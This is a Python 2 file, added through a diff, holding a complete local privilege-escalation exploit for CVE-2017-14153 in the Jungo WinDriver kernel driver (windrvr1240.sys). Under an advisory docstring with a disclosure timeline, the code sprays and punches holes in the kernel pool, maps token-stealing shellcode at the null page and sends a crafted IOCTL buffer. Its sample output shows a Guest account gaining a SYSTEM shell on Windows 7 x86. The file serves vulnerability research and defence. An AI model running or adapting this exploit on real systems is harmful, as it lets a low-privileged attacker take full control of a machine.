@@ -1,0 +1,410 @@
+# -*- coding: utf-8 -*-
+"""
+Jungo DriverWizard WinDriver Kernel Pool Overflow Vulnerability
+
+Download: http://www.jungo.com/st/products/windriver/
+File:     WD1240.EXE
+Sha1:     3527cc974ec885166f0d96f6aedc8e542bb66cba
+Driver:   windrvr1240.sys
+Sha1:     0f212075d86ef7e859c1941f8e5b9e7a6f2558ad
+CVE:      CVE-2017-14153
+Author:   Steven Seeley (mr_me) of Source Incite
+Affected: <= v12.4.0
+Thanks:   b33f, ryujin and sickness
+Analysis: http://srcincite.io/blog/2017/09/06/sharks-in-the-pool-mixed-object-exploitation-in-the-windows-kernel-pool.html
+
+Summary:
+========
+
+This vulnerability allows local attackers to escalate privileges on vulnerable installations of Jungo WinDriver. An attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability. 
+
+The specific flaw exists within the processing of IOCTL 0x953824b7 by the windrvr1240 kernel driver. The issue lies in the failure to properly validate user-supplied data which can result in a kernel pool overflow. An attacker can leverage this vulnerability to execute arbitrary code under the context of kernel.
+
+Timeline:
+=========
+
+2017-08-22 – Verified and sent to Jungo via sales@/first@/security@/info@jungo.com
+2017-08-25 – No response from Jungo and two bounced emails
+2017-08-26 – Attempted a follow up with the vendor via website chat
+2017-08-26 – No response via the website chat
+2017-09-03 – Recieved an email from a Jungo representative stating that they are "looking into it"
+2017-09-03 – Requested a timeframe for patch development and warned of possible 0day release
+2017-09-06 – No response from Jungo
+2017-09-06 – Public 0day release of advisory
+
+Example:
+========
+
+C:\Users\Guest\Desktop>icacls poc.py
+poc.py NT AUTHORITY\Authenticated Users:(I)(F)
+       NT AUTHORITY\SYSTEM:(I)(F)
+       BUILTIN\Administrators:(I)(F)
+       BUILTIN\Users:(I)(F)
+       Mandatory Label\Low Mandatory Level:(I)(NW)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\Users\Guest\Desktop>whoami
+debugee\guest
+
+C:\Users\Guest\Desktop>poc.py
+
+        --[ Jungo DriverWizard WinDriver Kernel Pool Overflow EoP exploit ]
+                       Steven Seeley (mr_me) of Source Incite
+
+(+) spraying pool with mixed objects...
+(+) sprayed the pool!
+(+) making pool holes...
+(+) made the pool holes!
+(+) allocating shellcode...
+(+) allocated the shellcode!
+(+) triggering pool overflow...
+(+) allocating pool overflow input buffer
+(+) elevating privileges!
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\Guest\Desktop>whoami
+nt authority\system
+
+C:\Users\Guest\Desktop>
+"""
+from ctypes import *
+from ctypes.wintypes import *
+import struct, sys, os, time
+from platform import release, architecture
+
+ntdll    = windll.ntdll
+kernel32 = windll.kernel32
+MEM_COMMIT             = 0x00001000
+MEM_RESERVE            = 0x00002000
+PAGE_EXECUTE_READWRITE = 0x00000040
+STATUS_SUCCESS              = 0x0
+STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
+STATUS_INVALID_HANDLE       = 0xC0000008
+SystemExtendedHandleInformation = 64
+
+class LSA_UNICODE_STRING(Structure):
+    """Represent the LSA_UNICODE_STRING on ntdll."""
+    _fields_ = [
+        ("Length", USHORT),
+        ("MaximumLength", USHORT),
+        ("Buffer", LPWSTR),
+    ]
+
+class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
+    """Represent the SYSTEM_HANDLE_TABLE_ENTRY_INFO on ntdll."""
+    _fields_ = [
+        ("Object", c_void_p),
+        ("UniqueProcessId", ULONG),
+        ("HandleValue", ULONG),
+        ("GrantedAccess", ULONG),
+        ("CreatorBackTraceIndex", USHORT),
+        ("ObjectTypeIndex", USHORT),
+        ("HandleAttributes", ULONG),
+        ("Reserved", ULONG),
+    ]
+ 
+class SYSTEM_HANDLE_INFORMATION_EX(Structure):
+    """Represent the SYSTEM_HANDLE_INFORMATION on ntdll."""
+    _fields_ = [
+        ("NumberOfHandles", ULONG),
+        ("Reserved", ULONG),
+        ("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
+    ]
+
+class PUBLIC_OBJECT_TYPE_INFORMATION(Structure):
+    """Represent the PUBLIC_OBJECT_TYPE_INFORMATION on ntdll."""
+    _fields_ = [
+        ("Name", LSA_UNICODE_STRING),
+        ("Reserved", ULONG * 22),
+    ]
+
+class PROCESSENTRY32(Structure):
+    _fields_ = [
+        ("dwSize", c_ulong),
+        ("cntUsage", c_ulong),
+        ("th32ProcessID", c_ulong),
+        ("th32DefaultHeapID", c_int),
+        ("th32ModuleID", c_ulong),
+        ("cntThreads", c_ulong),
+        ("th32ParentProcessID", c_ulong),
+        ("pcPriClassBase", c_long),
+        ("dwFlags", c_ulong),
+        ("szExeFile", c_wchar * MAX_PATH)
+    ]
+
+Process32First = kernel32.Process32FirstW
+Process32Next  = kernel32.Process32NextW
+
+def signed_to_unsigned(signed):
+    """
+    Convert signed to unsigned integer.
+    """
+    unsigned, = struct.unpack ("L", struct.pack ("l", signed))
+    return unsigned
+                
+def get_type_info(handle):
+    """
+    Get the handle type information to find our sprayed objects.
+    """
+    public_object_type_information = PUBLIC_OBJECT_TYPE_INFORMATION()
+    size = DWORD(sizeof(public_object_type_information))
+    while True:
+        result = signed_to_unsigned(
+            ntdll.NtQueryObject(
+                handle, 2, byref(public_object_type_information), size, None))
+        if result == STATUS_SUCCESS:
+            return public_object_type_information.Name.Buffer
+        elif result == STATUS_INFO_LENGTH_MISMATCH:
+            size = DWORD(size.value * 4)
+            resize(public_object_type_information, size.value)
+        elif result == STATUS_INVALID_HANDLE:
+            return None
+        else:
+            raise x_file_handles("NtQueryObject.2", hex (result))
+
+def get_handles():
+    """
+    Return all the processes handles in the system at the time.
+    Can be done from LI (Low Integrity) level on Windows 7 x86.
+    """
+    system_handle_information = SYSTEM_HANDLE_INFORMATION_EX()
+    size = DWORD (sizeof (system_handle_information))
+    while True:
+        result = ntdll.NtQuerySystemInformation(
+            SystemExtendedHandleInformation,
+            byref(system_handle_information),
+            size,
+            byref(size)
+        )
+        result = signed_to_unsigned(result)
+        if result == STATUS_SUCCESS:
+            break
+        elif result == STATUS_INFO_LENGTH_MISMATCH:
+            size = DWORD(size.value * 4)
+            resize(system_handle_information, size.value)
+        else:
+            raise x_file_handles("NtQuerySystemInformation", hex(result))
+
+    pHandles = cast(
+        system_handle_information.Handles,
+        POINTER(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * \
+                system_handle_information.NumberOfHandles)
+    )
+    for handle in pHandles.contents:
+        yield handle.UniqueProcessId, handle.HandleValue, handle.Object
+
+def we_can_alloc_shellcode():
+    """ 
+    This function allocates the shellcode @ the null page making
+    sure the new OkayToCloseProcedure pointer points to shellcode.
+    """
+    baseadd   = c_int(0x00000004)
+    null_size = c_int(0x1000)
+
+    tokenstealing = (
+    "\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x8B\xC8\x8B\x80"
+    "\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x83\xB8\xB4\x00\x00\x00\x04"
+    "\x75\xEC\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\xC2\x10"
+    "\x00" )
+    
+    OkayToCloseProcedure = struct.pack("<L", 0x00000078)
+    sc  = "\x42" * 0x70 + OkayToCloseProcedure
+
+    # first we restore our smashed TypeIndex
+    sc += "\x83\xC6\x0c"              # add esi, 0c
+    sc += "\xc7\x06\x0a\x00\x08\x00"  # mov [esi], 8000a
+    sc += "\x83\xee\x0c"              # sub esi, 0c 
+    sc += tokenstealing
+    sc += "\x90" * (0x400-len(sc))
+    ntdll.NtAllocateVirtualMemory.argtypes = [c_int, POINTER(c_int), c_ulong, 
+                                              POINTER(c_int), c_int, c_int]
+    dwStatus = ntdll.NtAllocateVirtualMemory(0xffffffff, byref(baseadd), 0x0, 
+                                             byref(null_size), 
+                                             MEM_RESERVE|MEM_COMMIT,
+                                             PAGE_EXECUTE_READWRITE)
+    if dwStatus != STATUS_SUCCESS:
+        print "(-) error while allocating the null paged memory: %s" % dwStatus
+        return False
+    written = c_ulong()
+    write = kernel32.WriteProcessMemory(0xffffffff, 0x00000004, sc, 0x400, byref(written))
+    if write == 0:
+        print "(-) error while writing our junk to the null paged memory: %s" % write
+        return False
+    return True
+
+def we_can_spray():
+    """
+    Spray the Kernel Pool with IoCompletionReserve and Event Objects. 
+    The IoCompletionReserve object is 0x60 and Event object is 0x40 bytes in length.
+    These are allocated from the Nonpaged kernel pool.
+    """
+    handles = []
+    IO_COMPLETION_OBJECT = 1
+    for i in range(0, 25000):
+        handles.append(windll.kernel32.CreateEventA(0,0,0,0))
+        hHandle = HANDLE(0)
+        handles.append(ntdll.NtAllocateReserveObject(byref(hHandle), 0x0, IO_COMPLETION_OBJECT))
+
+    # could do with some better validation
+    if len(handles) > 0:
+        return True
+    return False
+
+def alloc_pool_overflow_buffer(base, input_size):
+    """
+    Craft our special buffer to trigger the overflow.
+    """
+    print "(+) allocating pool overflow input buffer"
+    baseadd   = c_int(base)
+    size = c_int(input_size)
+    input  = "\x41" * 0x18                     # offset to size
+    input += struct.pack("<I", 0x0000008d)     # controlled size (this triggers the overflow)
+    input += "\x42" * (0x90-len(input))        # padding to survive bsod
+    input += struct.pack("<I", 0x00000000)     # use a NULL dword for sub_4196CA
+    input += "\x43" * ((0x460-0x8)-len(input)) # fill our pool buffer
+    
+    # repair the allocated chunk header...
+    input += struct.pack("<I", 0x040c008c)     # _POOL_HEADER
+    input += struct.pack("<I", 0xef436f49)     # _POOL_HEADER (PoolTag)
+    input += struct.pack("<I", 0x00000000)     # _OBJECT_HEADER_QUOTA_INFO
+    input += struct.pack("<I", 0x0000005c)     # _OBJECT_HEADER_QUOTA_INFO
+    input += struct.pack("<I", 0x00000000)     # _OBJECT_HEADER_QUOTA_INFO
+    input += struct.pack("<I", 0x00000000)     # _OBJECT_HEADER_QUOTA_INFO
+    input += struct.pack("<I", 0x00000001)     # _OBJECT_HEADER (PointerCount)
+    input += struct.pack("<I", 0x00000001)     # _OBJECT_HEADER (HandleCount)
+    input += struct.pack("<I", 0x00000000)     # _OBJECT_HEADER (Lock)
+    input += struct.pack("<I", 0x00080000)     # _OBJECT_HEADER (TypeIndex)
+    input += struct.pack("<I", 0x00000000)     # _OBJECT_HEADER (ObjectCreateInfo)
+    
+    # filler
+    input += "\x44" * (input_size-len(input))
+    ntdll.NtAllocateVirtualMemory.argtypes = [c_int, POINTER(c_int), c_ulong, 
+                                              POINTER(c_int), c_int, c_int]
+    dwStatus = ntdll.NtAllocateVirtualMemory(0xffffffff, byref(baseadd), 0x0, 
+                                             byref(size), 
+                                             MEM_RESERVE|MEM_COMMIT,
+                                             PAGE_EXECUTE_READWRITE)
+    if dwStatus != STATUS_SUCCESS:
+        print "(-) error while allocating memory: %s" % hex(dwStatus + 0xffffffff)
+        return False
+    written = c_ulong()
+    write = kernel32.WriteProcessMemory(0xffffffff, base, input, len(input), byref(written))
+    if write == 0:
+        print "(-) error while writing our input buffer memory: %s" % write
+        return False
+    return True
+
+def we_can_trigger_the_pool_overflow():
+    """
+    This triggers the pool overflow vulnerability using a buffer of size 0x460.
+    """
+    GENERIC_READ  = 0x80000000
+    GENERIC_WRITE = 0x40000000
+    OPEN_EXISTING = 0x3
+    DEVICE_NAME   = "\\\\.\\WinDrvr1240"
+    dwReturn      = c_ulong()
+    driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
+    inputbuffer       = 0x41414141
+    inputbuffer_size  = 0x5000
+    outputbuffer_size = 0x5000
+    outputbuffer      = 0x20000000
+    alloc_pool_overflow_buffer(inputbuffer, inputbuffer_size)
+    IoStatusBlock = c_ulong()
+
+    if driver_handle:
+        dev_ioctl = ntdll.ZwDeviceIoControlFile(driver_handle, None, None, None, byref(IoStatusBlock), 0x953824b7,
+                                                inputbuffer, inputbuffer_size, outputbuffer, outputbuffer_size)
+        return True
+    return False
+
+def we_can_make_pool_holes():
+    """
+    This makes the pool holes that will coalesce into a hole of size 0x460.
+    """
+    global khandlesd
+    mypid = os.getpid()
+    khandlesd = {}
+    khandlesl = []
+    
+    # leak kernel handles
+    for pid, handle, obj in get_handles():
+
+        # mixed object attack
+        if pid == mypid and (get_type_info(handle) == "Event" or get_type_info(handle) == "IoCompletionReserve"):
+            khandlesd[obj] = handle
+            khandlesl.append(obj)
+
+    # Find holes and make our allocation
+    holes = []
+    for obj in khandlesl:
+
+        # obj address is the handle address, but we want to allocation
+        # address, so we just remove the size of the object header from it.
+        alloc = obj - 0x30
+
+        # Get allocations at beginning of the page
+        if (alloc & 0xfffff000) == alloc:
+            bin = []
+
+            # object sizes
+            CreateEvent_size         = 0x40
+            IoCompletionReserve_size = 0x60
+            combined_size            = CreateEvent_size + IoCompletionReserve_size
+
+            # after the 0x20 chunk hole, the first object will be the IoCompletionReserve object
+            offset = IoCompletionReserve_size   
+            for i in range(offset, offset + (7 * combined_size), combined_size):
+                try:
+                    # chunks need to be next to each other for the coalesce to take effect
+                    bin.append(khandlesd[obj + i])
+                    bin.append(khandlesd[obj + i - IoCompletionReserve_size])
+                except KeyError:
+                    pass
+
+            # make sure it's contiguously allocated memory
+            if len(tuple(bin)) == 14:
+                holes.append(tuple(bin))
+
+    # make the holes to fill
+    for hole in holes:
+        for handle in hole:
+            kernel32.CloseHandle(handle)
+    return True
+
+def trigger_lpe():
+    """
+    This function frees the IoCompletionReserve objects and this triggers the 
+    registered aexit, which is our controlled pointer to OkayToCloseProcedure.
+    """
+    # free the corrupted chunk to trigger OkayToCloseProcedure
+    for k, v in khandlesd.iteritems():
+        kernel32.CloseHandle(v)
+    os.system("cmd.exe")
+
+def main():
+    print "\n\t--[ Jungo DriverWizard WinDriver Kernel Pool Overflow EoP exploit ]"
+    print "\t               Steven Seeley (mr_me) of Source Incite\r\n"
+
+    if release() != "7" or architecture()[0] != "32bit":
+        print "(-) although this exploit may work on this system,"
+        print "    it was only designed for Windows 7 x86."
+        sys.exit(-1)
+
+    print "(+) spraying pool with mixed objects..."
+    if we_can_spray():
+        print "(+) sprayed the pool!"
+        print "(+) making pool holes..."
+        if we_can_make_pool_holes():
+            print "(+) made the pool holes!"
+            print "(+) allocating shellcode..."
+            if we_can_alloc_shellcode():
+                print "(+) allocated the shellcode!"
+                print "(+) triggering pool overflow..."
+                if we_can_trigger_the_pool_overflow():
+                    print "(+) elevating privileges!"
+                    trigger_lpe()
+
+if __name__ == '__main__':
+    main()
